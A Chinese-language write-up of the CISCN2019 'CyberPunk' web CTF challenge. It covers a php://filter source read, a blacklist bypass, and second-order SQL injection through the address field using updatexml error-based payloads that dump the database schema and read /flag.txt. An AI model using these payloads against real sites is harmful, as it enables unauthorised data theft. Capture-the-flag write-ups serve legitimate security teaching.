# \[CISCN2019 华北赛区 Day1 Web5]CyberPunk

## \[CISCN2019 华北赛区 Day1 Web5]CyberPunk

## 考点

* 文件包含配合伪协议读取文件
* 代码审计
* 注入点寻找与判断
* 报错注入

## wp

F12有个提示，GET参数file

![](../.gitbook/assets/image\_ghy78fM78JSxubyt67i6Ef.png)

访问?file=delete.php发现展示了主页和删除两个页面，不出意外是include("delete.php")了

使用php://filter可以获取源码

?file=php://filter/convert.base64-encode/resource=delete.php

![](../.gitbook/assets/image\_uofpqGYbbNPt4xCfkw1wFZ.png)

分别读取index.php，delete.php，confirm.php，change.php，search.php，config.php

一个功能一个功能看，index.php用于显示页面和构造文件读取漏洞，订单提交的目标脚本是confirm.php，在config.php中初始化了SQL实例对象

在index.php填写数据提交，在confirm.php接收三个参数，user\_name、address、phone

对user\_name和phone进行黑名单检测，通过后执行查询语句。`select * from user where user_name='user_name' and phone='phone'`

禁用字符串如下，

```
select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile
```

如果没有查询到相同的订单就插入一个新的，不过这里插入用的是预编译的方式。要注意的是，这里插入address的时候并没有检验它的值，只检验了user\_name和address。到这感觉是二次注入。

```php
$sql = "insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)";
$re = $db->prepare($sql);
$re->bind_param("sss", $user_name, $address, $phone);
$re = $re->execute();
```

![](../.gitbook/assets/image\_exaTa9mbwUXYZ2KTZvH1cJ.png)

查询的功能是在search.php实现，获取两个参数，user\_name和phone，然后对它们进行同上的黑名单检测，然后执行`select * from user where user_name='user_name' and phone='phone'`，把所有信息返回。

![](../.gitbook/assets/image\_nV7DJ8cz7hvjBcqhJ9n1PW.png)

修改的功能在change.php实现，在获取参数时，对user\_name和phone进行黑名单检测，对address执行addslashes函数（在单双引号和反斜杠前加反斜杠）。

在通过黑名单检测后，先查询确定订单存在，然后再进行更新操作，不过只能进行地址修改的操作。

```php
update user set address="address", old_address="$row['address']" where user_id="$row['user_id']"
```

![](../.gitbook/assets/image\_sLt9B8LZE8xLooUMhNNFKw.png)

最后是订单删除的操作，和查询本质上差不多，找到订单然后删除。

现在大概的思路就是，新建一个订单在地址插入payload1，然后在修改订单的地方插入payload2，最后在查询的地方进行回显。会被addslashes进行转义的是payload2

```php
insert into user ( user_name, address, phone) values( "aaaa", "payload1", "aaaa")
update user set address='payload2', old_address='payload1' where user_id=1
```

如果payload1是一个单引号，那么在修改时，会报如下错误，也就是说在payload1处闭合语句可以构造注入

![](../.gitbook/assets/image\_9f5au5xNPSTiEDVvvrPuEd.png)

先新建一个订单，地址填单引号，其他全填aaa，然后修改订单信息，可以看到订单id，是1

再新建一个订单，全填aaaa，地址要填这个``bbbb' where `user_id`=1#``，然后修改订单

再去查询处，填写aaa，可以发现注入成功

![](../.gitbook/assets/image\_kQs3wev9HRqkj2rRABQCDA.png)

剩下的就是经典的拼语句了，update注入之报错注入

* ``bbbb' where `user_id`=updatexml(1,concat(0x7e,(select count(SCHEMA_NAME) from information_schema.SCHEMATA),0x7e),1)#``
* ``bbbb' where `user_id`=updatexml(1,concat(0x7e,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),0x7e),1)#``
* ``bbbb' where `user_id`=updatexml(1,concat(0x7e,(select reverse(group_concat(SCHEMA_NAME)) from information_schema.SCHEMATA),0x7e),1)#``
* ``bbbb' where `user_id`=updatexml(1,concat(0x7e,(select substr(group_concat(SCHEMA_NAME),30,50) from information_schema.SCHEMATA),0x7e),1)#``

第一个语句可以得到数据库数量，第二个和第三个可以得到部分数据库，如下information\_schema,ctftraining,erformance\_schema,test,ctfusers

中间少了一个，如果想知道是什么就要用substr了，即第四个，得到

g,mysql,performance\_schema,test

完整六个数据库就是information\_schema,ctftraining,mysql,performance\_schema,test,ctfusers

然后是表名

* `bbbb' where user_id=updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='ctfusers'),0x7e),1)#`
* `bbbb' where user_id=updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='ctftraining'),0x7e),1)#`

第一个是user，第二个是FLAG\_TABLE,news,users

然后看字段

* `bbbb' where user_id=updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='FLAG_TABLE'),0x7e),1)#`

是FLAG\_COLUMN

最后查看值

* `bbbb' where user_id=updatexml(1,concat(0x7e,(select FLAG_COLUMN from ctftraining.FLAG_TABLE),0x7e),1)#`

都是空的，结果payload是这样

`bbbb' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,20)),0x7e),1)#`

看不完整前面提到解决方案了

## 小结

1. 报错注入回显有长度限制，可以使用reverse，也可以使用limit，也可以修改substr的参数
2. `select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA`
3. `select reverse(group_concat(SCHEMA_NAME)) from information_schema.SCHEMATA`
4. `select substr(group_concat(SCHEMA_NAME),30,50) from information_schema.SCHEMATA`
